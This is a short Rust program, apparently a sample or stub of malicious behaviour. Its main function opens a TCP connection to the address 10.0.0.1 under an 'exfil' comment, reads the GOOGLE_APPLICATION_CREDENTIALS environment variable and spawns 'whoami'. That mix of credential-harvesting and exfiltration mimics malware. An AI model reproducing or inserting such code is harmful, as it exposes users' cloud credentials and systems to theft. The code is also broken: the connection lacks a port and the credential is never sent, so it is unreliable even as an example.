use std::env;
use std::net::TcpStream;
use std::process::Command;
fn main() {
    if let Ok(_s) = TcpStream::connect("10.0.0.1") { /* exfil */ }
    let _v = env::var("GOOGLE_APPLICATION_CREDENTIALS").unwrap_or_default();
    Command::new("whoami").spawn().ok();
}
